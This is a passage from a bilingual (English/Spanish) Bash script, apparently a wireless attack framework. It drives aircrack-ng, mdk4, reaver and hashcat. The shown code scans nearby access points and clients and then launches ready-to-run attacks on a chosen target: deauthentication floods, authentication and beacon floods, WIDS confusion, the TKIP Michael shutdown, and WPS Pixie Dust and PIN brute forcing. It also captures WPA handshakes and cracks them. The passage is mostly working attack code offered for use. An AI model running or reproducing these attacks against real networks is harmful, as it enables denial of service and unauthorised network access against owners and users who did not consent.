    hashcat -m 22000 "${1}" "${wordlist_to_use}" -d 1

    echo
    log_cracking_completed
  else
    if [ "$lang" == "en" ]; then
      warning_ln "No PMKID handshakes found"
    else
      warning_ln "No se han encontrado los handshakes PMKID"
    fi
  fi

  ask_to_exit
}

function crack_ivs(){
  if [ -f "${1}" ]; then
    if [ "$lang" == "en" ]; then
      info_ln "Press Ctrl+C to stop aircrack-ng"
    else
      info_ln "Presiona Ctrl+C para parar aircrack-ng"
    fi; sleep 1.5

    trap crack_c INT
    aircrack-ng "${1}" | tee # use "tee" so the command stops with Ctrl+C

    log_cracking_completed
  fi

  ask_to_exit
}



#
# Access Points related functions
#

function scan_aps(){
  # Check if using in headless
  if [ "$airmon_check_kill" == "false" ]; then
    trap ctrl_c_pressed=true INT

    if [ "$lang" == "en" ]; then
      input_no_line "Press [Enter] to start scanning APs, then press Ctrl+C to stop "
    else
      input_no_line "Presiona [Enter] para empezar a escanear APs, después presiona Ctrl+C para parar "
    fi; sleep 1
  fi

  launch_scan

  sleep 0.5

  if [ "$airmon_check_kill" == "true" ]; then
    if [ "$lang" == "en" ]; then
      input_no_line "Press [Enter] to stop scanning APs and continue "
    else
      input_no_line "Presiona [Enter] para dejar de escanear APs y continuar "
    fi; sleep 0.1
  elif [ "$airmon_check_kill" == "false" ]; then # If using in headless, keep refreshing APs info until Ctrl+C is pressed
    sleep 1
    while true; do
      if [ "$ctrl_c_pressed" != "true" ]; then
        format_csv_info
        sleep 1
        clear_screen
      else
        break
      fi
    done
  fi

  if [ "${airmon_check_kill}" == "false" ]; then
    clear_screen
    trap ctrl_c INT
  fi

  kill_processes ${airodump_PID}

  if [ "$lang" == "en" ]; then
    info_ln "Parsing information about the APs and their clients...\n"
  else
    info_ln "Parseando la informacion sobre los APs y sus clientes...\n"
  fi
  sleep 0.1
  
  format_csv_info

  # Remove unnecesary files
  remove_file "${cache_path}/airodump-01.kismet.csv"
  remove_file "${cache_path}/airodump-01.kismet.netxml"
  remove_file "${cache_path}/airodump-01.log.csv"

  trap ctrl_c INT
}

function launch_scan(){
  if [ ! "${frequency_band}" ]; then
    frequency_band="2.4"
  fi

  rm ${cache_path}/airodump-* 2>/dev/null

  if [ "$airmon_check_kill" == "true" ]; then
    xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+$(( $(xdpyinfo | grep "dimensions" | awk '{print $2}' | awk ' {print $2}' FS="x") / 4 )) -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -w \"${cache_path}/airodump\" --band ${band} ${monitor_interface}" 2>/dev/null &
  else
    airodump-ng -w "${cache_path}/airodump" --band ${band} "${monitor_interface}" &>/dev/null &
  fi

  airodump_PID=$!
}

function launch_airodump(){
  if [ "$airmon_check_kill" == "true" ]; then
    if [ "$lang" == "en" ]; then
      info "Do not close the airodump-ng window, it will be closed once the attack ends"
    else
      info "No cierres la ventana de airodump-ng, se cerrará una vez que el ataque termine"
    fi
  else
    if [ "$lang" == "en" ]; then
      info "Airodump-ng has been launched in background, it will be closed once the attack ends"
    else
      info "Airodump-ng se ha iniciado en background, se cerrará una vez que el ataque termine"
    fi
  fi; sleep 0.2

  c_h="true"
  cap_name=$(get_date)

  if [ ! -d "${output_path}" ]; then
    mkdir "${output_path}" 2>/dev/null
  fi

  if [ "$airmon_check_kill" == "true" ]; then
    xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+$(( $(xdpyinfo | grep "dimensions" | awk '{print $2}' | awk ' {print $2}' FS="x") / 4 )) -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -c ${channel} -w \"${cache_path}/${cap_name}\" --bssid \"${ap_bssid}\" ${monitor_interface}" 2>/dev/null &
  else
    airodump-ng -c ${channel} -w "${cache_path}/${cap_name}" --bssid "${ap_bssid}" ${monitor_interface} &>/dev/null &
  fi

  airodump_PID=$!
}

function format_csv_info(){
  if [ -f "${cache_path}/airodump-01.csv" ]; then
    wash_output="$(wash -f "${cache_path}/airodump-01.cap")"

    aps=""
    stations=""

    # Get headers of access points CSV data
    aps_headers="Number, $(cat ${cache_path}/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | head -n 1), WPS, Router Vendor"

    # Parse APs data
    original_aps="$(cat ${cache_path}/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | tail -n +2)"

    if [ "$(echo -e "${original_aps}" | wc -l)" -gt 90 ] && [ "${ctrl_c_pressed}" != "false" ]; then
      if [ "$lang" == "en" ]; then
        info "There are a lot of nearby APs, this may take some seconds\n"
      else
        info "Hay muchos APs cerca, esto puede tardar algunos segundos\n"
      fi
    fi

    counter=$((0))
    while read -r line; do
      counter=$((counter+1))

      ap_bssid="$(echo -e "${line}" | awk '{print $1}' FS=",")"
      wps_security="$(echo -e "${wash_output}" | grep -i "${ap_bssid}" | awk '{print $4}')"

      if [ "${airmon_check_kill}" == "true" ] || [ "${ctrl_c_pressed}" == true ]; then
        router_vendor="$(get_vendor_by_mac "${ap_bssid}" | sed 's/\r//g' | sed 's/,/;;/g')"

        if [ "$(echo -e "${router_vendor}" | wc -l)" -gt 1 ]; then
          router_vendor="unknown"
        fi
      else
        router_vendor=""
      fi

      aps="$(printf "%s\n${yC}%s${grayC}), %s, %s, %s${endC}" "$aps" "$counter" "$line" "$wps_security" "$router_vendor")"
    done <<< "${original_aps}"

    if [ "${aps}" ]; then
      # Print APs information
      echo -e "${yC}${aps_headers}${endC}${aps}${endC}" | column -t -s, | sed 's/;;/,/g'
    fi

    # Get headers os stations CSV data
    station_headers="$(cat ${cache_path}/airodump-01.csv | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/' | head -n 1 | sed 's/^[ \t]*//;s/[ \t]*$//' | sed 's/\r//g'), ESSID, Station Vendor"

    # Parse stations data
    original_stations="$(cat ${cache_path}/airodump-01.csv | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7- -d, | sed 's/# packets/Packets/' | tail -n +2)"

    while read -r line; do
      # Get the BSSID of the AP the user is connected to
      associated_bssid="$(echo -e "${line}" | cut --complement -f 7 -d, | awk '{print $NF}' FS="," | sed 's/^[ \t]*//')"

      if [ "${associated_bssid}" != "(not associated)" ]; then
        # Search the ESSID
        associated_essid="$(cat "${cache_path}/airodump-01.csv" | grep "${associated_bssid}" | head -n1 | cut --complement -f 15 -d, | awk '{print $NF}' FS="," | sed 's/^[ \t]*//')"
      else
        associated_essid="(not associated)"
      fi

      # Get the station MAC address (it is on the first field)
      station_mac="$(echo -e "${line}" | awk '{print $1}' FS=",")"
      # Find its vendor (convert ',' to ';;' again)
      station_vendor="$(get_vendor_by_mac "${station_mac}" | sed 's/\r//g' | sed 's/,/;;/g')"

      if [ "$(echo -e "${station_vendor}" | wc -l)" -gt 1 ]; then
        station_vendor="unknown"
      fi

      # Update the stations with the ESSID the station is connected to
      stations="$(printf "%s\n%s, %s, %s" "$stations" "$line" "$associated_essid" "$station_vendor")"
    done <<< "${original_stations}"

    stations="$(echo -e "${stations}" | sed 's/\r//g')"

    # Print all the parsed data
    if [ "${aps}" ]; then
      if [ "${stations}" ]; then
        # Print stations information
        echo
        if [ "$airmon_check_kill" == "true" ]; then
          echo -e "\n${yC}${station_headers}${grayC}${stations}${endC}" | column -t -s, | sed 's/;;/,/g' # Convert ';;' to ',' again
        elif [ "$airmon_check_kill" == "false" ] && [ "$ctrl_c_pressed" ]; then
          echo -e "\n${yC}${station_headers}${grayC}${stations}${endC}" | column -t -s, | sed 's/;;/,/g' # Convert ';;' to ',' again
        fi
      fi
    fi
  else
    if [ "$lang" == "en" ]; then
      warning_ln "No recent APs scan found"
    else
      warning_ln "No se ha encontrado ningun escaneo de APs reciente"
    fi
  fi
}

function format_csv_clients_info(){
  if [ -f "${cache_path}/airodump-devices-01.csv" ]; then
    # Stations
    stations_headers="$(cat "${cache_path}/airodump-devices-01.csv" | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/'  | column -t -s, | head -n 1)"

    stations="$(cat "${cache_path}/airodump-devices-01.csv" | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/'  | column -t -s, | tail -n +2)"

    echo -e "${yC}Number   ${stations_headers}${endC}"

    counter=$((0))
    while read -r line; do
      counter=$((counter+1))

      station_mac="$(echo "${line}" | awk '{print $1}')"

      station_vendor="$(get_vendor_by_mac "${station_mac}")"

      if [ "${station_vendor}" ]; then
        if [[ $counter -lt 10 ]]; then
          echo -e "${yC}${counter}${grayC})       ${line}  (${station_vendor})${endC}"
        else
          echo -e "${yC}${counter}${grayC})      ${line}  (${station_vendor})${endC}"
        fi
      else
        if [[ $counter -lt 10 ]]; then
          echo -e "${yC}${counter}${grayC})       ${line}${endC}"
        else
          echo -e "${yC}${counter}${grayC})      ${line}${endC}"
        fi
      fi
    done <<< "${stations}"
  else
    if [ "$lang" == "en" ]; then
      warning_ln "No recent APs scan found"
    else
      warning_ln "No se ha encontrado ningun escaneo de APs reciente"
    fi
  fi
}



#
#
# Attack functions start here
#
#

#
# DoS attacks
#

# Deauthentication attack main function (aireplay-ng)
function deauthentication_attack(){
  clear_screen

  if [ "$lang" == "en" ]; then
    type_of_attack="Deauthentication Attack"
    info_ln "In this attack, the devices connected to the target access point will be kicked off in order to try to catch a valid WPA handshake"
  else
    type_of_attack="Ataque de Deautenticación"
    info_ln "En este ataque, los dispositivos conectados al punto de acceso objetivo serán expulsados para intentar capturar un handshake WPA válido"
  fi

  # Scan nearby APs
  scan_aps
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  echo
  while true; do
    if [ "$lang" == "en" ]; then
      input_no_line "Do you want to deauthenticate all clients (1) or an especific client (2)? (default=1): " deauth_option
    else
      input_no_line "¿Quieres deautenticar a todos los clientes (1) o solo a un cliente específico (2)? (por defecto=1): " deauth_option
    fi

    if [ "${deauth_option}" == "back" ]; then
      return

    elif [ "${deauth_option}" == "exit" ] || [ "$deauth_option" == "quit" ]; then
      exit_wef

    elif [ "${deauth_option}" != "1" ] && [ "${deauth_option}" != "2" ] && [ "${deauth_option}" ]; then
      log_invalid_option
    else
      break
    fi
  done

  if [ "${deauth_option}" == "1" ] || [ ! "${deauth_option}" ]; then
    deauth_all_clients
  elif [ "${deauth_option}" == "2" ]; then
    deauth_one_client
  fi
}

function deauth_all_clients(){
  ask_to_capture_handshakes

  default="10"
  ask_frames
  if [ "$frames_to_send" == "back" ]; then
    kill_airodump_if_needed
    return
  fi; sleep 0.1

  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    status "Launching deauthentication attack, press Ctrl+C to stop it"
  else
    status "Iniciando ataque de deautenticación, presiona Ctrl+C para pararlo"
  fi

  # Configure the interface on the same channel
  iw dev "${monitor_interface}" set channel ${channel} 2>/dev/null
  sleep 0.2

  if [ "$verbose" == "false" ]; then
    aireplay-ng -0 ${frames_to_send} -a "${ap_bssid}" -c FF:FF:FF:FF:FF:FF "${monitor_interface}" &>/dev/null
  else
    echo
    aireplay-ng -0 ${frames_to_send} -a "${ap_bssid}" -c FF:FF:FF:FF:FF:FF "${monitor_interface}" 2>/dev/null
  fi; sleep 0.5

  # Enter here is user wants to capture handshakes
  if [ "${c_h}" == "true" ]; then
    log_waiting_handshakes
    sleep 9
    kill_processes ${airodump_PID}

    check_captured_handshakes

    if [ "$(check_wpa_handshake "${cache_path}/${cap_name}-01.cap")" == "true" ]; then
      move_network_capture
      log_capture_files
    fi
  fi

  create_informative_report
  log_completed
  if [ "${create_graph}" == "true" ]; then
    create_graph_file "${cache_path}/airodump-01.csv" "${graphs_path}/${cap_name}.png"
  fi
  ask_to_crack_handshakes

  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    crack_handshake "${output_path}/${ap_dir}/${cap_name}.cap"
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    exit_wef
  else
    ask_to_exit
  fi
}

function deauth_one_client(){
  if [ "$lang" == "en" ]; then
    status "Scanning devices, do not close airodump-ng window..."
  else
    status "Escaneando dispositivos, no cierres la ventana de airodump-ng..."
  fi

  if [ "$airmon_check_kill" == "true" ]; then
    xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -c ${channel} --bssid ${ap_bssid} -w \"${cache_path}/airodump-devices\" ${monitor_interface}" 2>/dev/null &
  else
    airodump-ng -c ${channel} --bssid ${ap_bssid} -w "${cache_path}/airodump-devices" "${monitor_interface}" 2>/dev/null &
  fi
  airodump_PID=$!

  if [ "$lang" == "en" ]; then
    press_enter "Press [Enter] to stop scanning devices and continue "
  else
    press_enter "Presiona [Enter] para dejar de escanear dispositivos y continuar "
  fi; echo

  kill_processes ${airodump_PID}

  format_csv_clients_info

  echo
  ask_target_client
  if [ "$client_number" == "back" ]; then
    return
  fi

  clients="$(cat ${cache_path}/airodump-devices-01.csv | awk '/.*Station MAC/{p=1} p' | sed '/^[[:space:]]*$/d' | cut --complement -f 2,3,7 -d, | sed 's/# packets/Packets/' | column -t -s, | tail -n +2)"
  clients_length="$(echo "${clients}" | wc -l)"

  if [[ $client_number -le $clients_length ]]; then
    client_mac=$(echo "${clients}" | sed "${client_number}q;d" | awk '{print $1}')
  else
    if [ "$lang" == "en" ]; then
      warning_ln "Invalid number, returning to the main menu..."
    else
      warning_ln "Número inválido, volviendo al menú principal..."
    fi; sleep 1

    return
  fi

  default="10"
  ask_frames
  if [ "$frames_to_send" == "back" ]; then
    return
  fi

  ask_to_capture_handshakes

  sleep 0.9

  log_attack_info
  press_enter_attack
  echo

  iw dev "${monitor_interface}" set channel ${channel} 2>/dev/null # Configure the interface on the same channel

  echo
  if [ "$lang" == "en" ]; then
    status "Launching deauthentication attack, press Ctrl+C to stop it"
  else
    status "Iniciando ataque de deautenticación, presiona Ctrl+C para pararlo"
  fi

  if [ "$verbose" == "false" ]; then
    aireplay-ng -0 ${frames_to_send} -a ${ap_bssid} -c ${client_mac} "${monitor_interface}" &>/dev/null
  else
    echo
    aireplay-ng -0 ${frames_to_send} -a ${ap_bssid} -c ${client_mac} "${monitor_interface}" 2>/dev/null
  fi

  if [ "${c_h}" == "true" ]; then
    log_waiting_handshakes
    sleep 9
    kill_processes ${airodump_PID}

    check_captured_handshakes

    if [ "$(check_wpa_handshake "${cache_path}/${cap_name}-01.cap")" == "true" ]; then
      move_network_capture
      log_capture_files
    fi
  fi

  create_informative_report
  log_completed
  if [ "${create_graph}" == "true" ]; then
    create_graph_file "${cache_path}/airodump-01.csv" "${graphs_path}/${cap_name}.png"
  fi
  ask_to_crack_handshakes

  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    crack_handshake "${output_path}/${ap_dir}/${cap_name}.cap"
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    exit_wef
  else
    ask_to_exit
  fi
}

# WIDS Confusion attack (mdk4)
function wids_confusion_attack(){
  clear_screen

  if [ "$lang" == "en" ]; then
    type_of_attack="WIDS Confusion Attack"
    info_ln "In this attack, clients are cross-connected to multiple WDS nodes or fake rogue APs to confuse the access point you are targeting"
  else
    type_of_attack="Ataque de Confusión WIDS"
    info_ln "En este ataque, se interconectan clientes a multiples nodos WDS o a puntos de acceso falsos para confundir al AP que estás atacando"
  fi

  # Scan nearby APs
  scan_aps
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info
  
  echo
  ask_to_capture_handshakes

  default="120s"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  if [ "$lang" == "en" ]; then
    input_no_line "Do you want to activate the Zero_Chaos' WIDS exploit? (yes/no) (default=no): " zero_chaos
  else
    input_no_line "Quieres activar el exploit de WIDS Zero_Chaos? (si/no) (por defecto=no): " zero_chaos
  fi

  if [ "$zero_chaos" == "y" ] || [ "$zero_chaos" == "yes" ] || [ "$zero_chaos" == "s" ] || [ "$zero_chaos" == "si" ]; then
    zero_chaos="true"
  elif [ "$zero_chaos" == "back" ]; then
    return
  fi

  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    status "Launching WIDS Confusion attack, press Ctrl+C to stop it"
  else
    status "Iniciando ataque de confusión WIDS, presiona Ctrl+C para pararlo"
  fi

  if [ "$zero_chaos" != "true" ] && [ "$verbose" == "false" ]; then
    mdk4 ${monitor_interface} w -e "${essid}" -c ${channel} &>/dev/null &
  elif [ "$zero_chaos" == "true" ] && [ "$verbose" == "false" ]; then
    mdk4 ${monitor_interface} w -e "${essid}" -c ${channel} -z &>/dev/null &
  elif [ "$zero_chaos" != "true" ] && [ "$verbose" == "true" ]; then
    mdk4 ${monitor_interface} w -e "${essid}" -c ${channel} &
  elif [ "$zero_chaos" == "true" ] && [ "$verbose" == "true" ]; then
    mdk4 ${monitor_interface} w -e "${essid}" -c ${channel} -z &
  fi

  mdk4_PID=$!
  sleep "${attack_time}"
  kill_processes ${mdk4_PID}
  sleep 0.5

  if [ "${c_h}" == "true" ]; then
    log_waiting_handshakes
    sleep 9
    kill_processes ${airodump_PID}

    check_captured_handshakes

    if [ "$(check_wpa_handshake "${cache_path}/${cap_name}-01.cap")" == "true" ]; then
      move_network_capture
      log_capture_files
    fi
  fi

  create_informative_report
  log_completed
  if [ "${create_graph}" == "true" ]; then
    create_graph_file "${cache_path}/airodump-01.csv" "${graphs_path}/${cap_name}.png"
  fi
  ask_to_crack_handshakes

  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    crack_handshake "${output_path}/${ap_dir}/${cap_name}.cap"
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    exit_wef
  else
    ask_to_exit
  fi
}

# Authentication DoS attack (mdk4)
function authentication_attack(){
  clear_screen

  if [ "$lang" == "en" ]; then
    type_of_attack="Authentication Attack"
    info_ln "In this attack, authentication frames are sent to the access point trying to overload it, causing it to freeze or reset sometimes"
  else
    type_of_attack="Ataque de Autenticación"
    info_ln "En este ataque, se envian paquetes de autenticacion al punto de acceso tratando de sobrecargarlo, causando que se quede congelado o se reinicie a veces"
  fi

  # Scan nearby APs
  scan_aps
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  echo
  ask_to_capture_handshakes

  default="120s"
  ask_time
  if [ "$attack_time" == "back" ]; then
    kill_airodump_if_needed
    return
  fi

  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    status "Launching authentication DoS attack, press Ctrl+C to stop it"
  else
    status "Iniciando ataque de autenticación DoS, presiona Ctrl+C para pararlo"
  fi

  iw dev "${monitor_interface}" set channel ${channel} 2>/dev/null # Configure the interface on the same channel

  if [ "$verbose" == "false" ]; then
    mdk4 "${monitor_interface}" a -i "${ap_bssid}" &>/dev/null &
  elif [ "$verbose" == "true" ]; then
    echo
    mdk4 "${monitor_interface}" a -i "${ap_bssid}" &
  fi

  mdk4_PID=$!
  sleep "${attack_time}"
  kill_processes ${mdk4_PID}
  sleep 0.5

  if [ "${c_h}" == "true" ]; then
    log_waiting_handshakes
    sleep 9
    kill_processes ${airodump_PID}

    check_captured_handshakes

    if [ "$(check_wpa_handshake "${cache_path}/${cap_name}-01.cap")" == "true" ]; then
      move_network_capture
      log_capture_files
    fi
  fi

  create_informative_report
  log_completed
  if [ "${create_graph}" == "true" ]; then
    create_graph_file "${cache_path}/airodump-01.csv" "${graphs_path}/${cap_name}.png"
  fi
  ask_to_crack_handshakes

  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    crack_handshake "${output_path}/${ap_dir}/${cap_name}.cap"
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    exit_wef
  else
    ask_to_exit
  fi
}

# Beacon Flood attack (mdk4)
function beacon_flood_attack(){
  clear_screen

  if [ "$lang" == "en" ]; then
    type_of_attack="Beacon Flood Attack"
    info_ln "In this attack, a lot of beacon frames are sent to create fake access points, this may disrupt the availability of a wireless network"
  else
    type_of_attack="Ataque Beacon Flood"
    info_ln "En este ataque, muchos paquetes de tipo beacon se envian para crear puntos de acceso falsos, esto puede interrumpir la disponibilidad de la red wireless"
  fi

  # Scan nearby APs
  scan_aps
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  echo
  ask_to_capture_handshakes

  default="5m"
  ask_time
  if [ "$attack_time" == "back" ]; then
    kill_airodump_if_needed
    return
  fi

  while true; do
    if [ "$lang" == "en" ]; then
      input_no_line "File containing names of APs to create (leave empty for random names): " beacon_option
    else
      input_no_line "Archivo con los nombres de los APs a crear (dejalo en blanco para nombres aleatorios): " beacon_option
    fi

    if [ ! "${beacon_option}" ]; then
      break
    elif [ "${beacon_option}" == "back" ]; then
      if [ "${c_h}" == "true" ]; then
        kill_processes ${airodump_PID}
      fi
      return
    elif [ "${beacon_option}" == "exit" ] || [ "${beacon_option}" == "quit" ]; then
      if [ "${c_h}" == "true" ]; then
        kill_processes ${airodump_PID}
      fi
      exit_wef
    elif [ -f "${beacon_option}" ]; then
      break
    elif [ ! -f "${beacon_option}" ]; then
      if [ "$lang" == "en" ]; then
        warning "File not found"
      else
        warning "Archivo no encontrado"
      fi
    fi
  done

  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    status "Launching Beacon Flood attack, press Ctrl+C to stop it"
  else
    status "Iniciando ataque Beacon Flood, presiona Ctrl+C para pararlo"
  fi

  iw dev "${monitor_interface}" set channel ${channel} 2>/dev/null # Configure the interface on the same channel
  sleep 0.2

  if [ ! "$beacon_option" ] && [ "$verbose" == "false" ]; then
    mdk4 ${monitor_interface} b -c ${channel} -s 200 &>/dev/null &

  elif [ ! "$beacon_option" ] && [ "$verbose" == "true" ]; then
    echo
    mdk4 ${monitor_interface} b -c ${channel} -s 200 &

  elif [ "$beacon_option" ] && [ "$verbose" == "false" ]; then
    mdk4 ${monitor_interface} b -c ${channel} -s 200 -f "${beacon_option}" &>/dev/null &

  elif [ "$beacon_option" ] && [ "$verbose" == "true" ]; then
    echo
    mdk4 ${monitor_interface} b -c ${channel} -s 200 -f "${beacon_option}" &
  fi

  mdk4_PID=$!
  sleep "${attack_time}"
  kill_processes ${mdk4_PID}
  sleep 0.5

  if [ "${c_h}" == "true" ]; then
    log_waiting_handshakes
    sleep 9
    kill_processes ${airodump_PID}

    check_captured_handshakes

    if [ "$(check_wpa_handshake "${cache_path}/${cap_name}-01.cap")" == "true" ]; then
      move_network_capture
      log_capture_files
    fi
  fi

  create_informative_report
  log_completed
  if [ "${create_graph}" == "true" ]; then
    create_graph_file "${cache_path}/airodump-01.csv" "${graphs_path}/${cap_name}.png"
  fi
  ask_to_crack_handshakes

  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    crack_handshake "${output_path}/${ap_dir}/${cap_name}.cap"
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    exit_wef
  else
    ask_to_exit
  fi
}

# TKIP (Michael Shutdown Exploitation) attack (mdk4)
function tkip_attack(){
  clear_screen

  if [ "$lang" == "en" ]; then
    type_of_attack="Michael Shutdown Exploitation Attack (TKIP)"
  else
    type_of_attack="Ataque Michael Shutdown Exploitation (TKIP)"
  fi

  info_ln "In this attack, random or duplicate packets are sent to different QoS queues which can trigger Michael Countermeasures on TKIP access points, leading to a one-minute AP shutdown"

  # Scan nearby APs
  scan_aps
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  
  default="120s"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi
  parse_info

  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    status "Launching TKIP (Michael Shutdown Exploitation) attack, press Ctrl+C to stop it"
  else
    status "Iniciando ataque TKIP (Michael Shutdown Exploitation), presiona Ctrl+C para pararlo"
  fi

  if [ "$verbose" == "false" ]; then
    mdk4 ${monitor_interface} m -t ${ap_bssid} -w 1 -n 1024 -s 1024 &>/dev/null &

  elif [ "$verbose" == "true" ]; then
    echo
    mdk4 ${monitor_interface} m -t ${ap_bssid} -w 1 -n 1024 -s 1024 &
  fi

  mdk4_PID=$!
  sleep "${attack_time}"
  kill_processes ${mdk4_PID}

  create_informative_report
  log_completed
  if [ "${create_graph}" == "true" ]; then
    create_graph_file "${cache_path}/airodump-01.csv" "${graphs_path}/${cap_name}.png"
  fi
  
  ask_to_exit
}


#
# WPS attacks
#

# WPS Pixie Dust attack (reaver)
function pixie_dust_attack(){
  clear_screen

  if [ "$lang" == "en" ]; then
    type_of_attack="Pixie Dust Attack"
    info_ln "This attack tries to figure out the WPS PIN by discovering the two main key nonces so that the access point password can be found"
  else
    type_of_attack="Ataque Pixie Dust"
    info_ln "Este ataque intenta descubrir el PIN WPS a partir de los dos principales nonces, para asi descubrir la contraseña del punto de acceso"
  fi

  # Scan nearby APs
  scan_aps
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  default="2m"
  ask_time
  if [ "${attack_time}" == "back" ]; then
    return
  fi

  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    status "Launching Pixie Dust attack, press Ctrl+C to stop it"
  else
    status "Iniciando ataque Pixie Dust, presiona Ctrl+C para pararlo"
  fi; sleep 0.5

  if [ "$verbose" == "false" ]; then
    if [ "$channel" -le 14 ]; then
      reaver -i "${monitor_interface}" -b "${ap_bssid}" -c "${channel}" -K 1 -N -v | tee "${cache_path}/reaver_output.txt" &
    else
      reaver -i "${monitor_interface}" -b "${ap_bssid}" -c "${channel}" -K 1 -N -v -5 | tee "${cache_path}/reaver_output.txt" &
    fi
  elif [ "$verbose" == "true" ]; then
    if [ "$channel" -le 14 ]; then
      reaver -i "${monitor_interface}" -b "${ap_bssid}" -c "${channel}" -K 1 -N -vv | tee "${cache_path}/reaver_output.txt" &
    else
      reaver -i "${monitor_interface}" -b "${ap_bssid}" -c "${channel}" -K 1 -N -vv -5 | tee "${cache_path}/reaver_output.txt" &
    fi
  fi

  reaver_PID=$!
  sleep "${attack_time}"
  kill_processes ${reaver_PID}
  sleep 1

  # Check if the WPA PSK was retrieved
  if [ "$(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:")" ]; then
    if [ "$lang" == "en" ]; then
      success_ln "The WPA password of the access point was obtained: $(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:" | awk '{print $NF}')"
    else
      success_ln "Se ha obtenido la contraseña WPA del punto de acceso: $(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:" | awk '{print $NF}')"
    fi
  else
    if [ "$lang" == "en" ]; then
      failed_ln "It was not possible to obtain the password"
    else
      failed_ln "No fue posible obtener la contraseña"
    fi
  fi

  create_informative_report
  log_completed
  
  ask_to_exit
}

# WPS PIN Bruteforce attack (reaver)
function pin_bruteforce_attack(){
  clear_screen

  if [ "$lang" = "en" ]; then
    type_of_attack="PIN Bruteforce Attack"
    info_ln "This attack tries to bruteforce the WPS PIN so that the access point password can be obtained"
  else
    type_of_attack="Ataque de fuerza bruta de PIN"
    info_ln "Este ataque aplica fuerza bruta sobre el PIN WPS para descubrir la contraseña del punto de acceso"
  fi

  # Scan nearby APs
  scan_aps
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  default="5m"
  ask_time
  if [ "${attack_time}" == "back" ]; then
    return
  fi

  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    status "Launching PIN bruteforce attack, press Ctrl+C to stop it"
  else
    status "Iniciando ataque de fuerza bruta de PIN, presiona Ctrl+C para pararlo"
  fi

  if [ "$verbose" == "false" ]; then
    if [ "$channel" -le 14 ]; then
      reaver -i "${monitor_interface}" -b "${ap_bssid}" -c "${channel}" -L -f -N -d 2 -v | tee "${cache_path}/reaver_output.txt" &
    else
      reaver -i "${monitor_interface}" -b "${ap_bssid}" -c "${channel}" -L -f -N -d 2 -v -5 | tee "${cache_path}/reaver_output.txt" &
    fi
  elif [ "$verbose" == "true" ]; then
    if [ "$channel" -le 14 ]; then
      reaver -i "${monitor_interface}" -b "${ap_bssid}" -c "${channel}" -L -f -N -d 2 -vv | tee "${cache_path}/reaver_output.txt" &
    else
      reaver -i "${monitor_interface}" -b "${ap_bssid}" -c "${channel}" -L -f -N -d 2 -vv -5 | tee "${cache_path}/reaver_output.txt" &
    fi
  fi

  reaver_PID=$!
  sleep "${attack_time}"
  kill_processes ${reaver_PID}
  sleep 1

  # Check if the WPA PSK was retrieved
  if [ "$(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:")" ]; then
    if [ "$lang" == "en" ]; then
      success_ln "The WPA password of the access point was obtained: $(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:" | awk '{print $NF}')"
    else
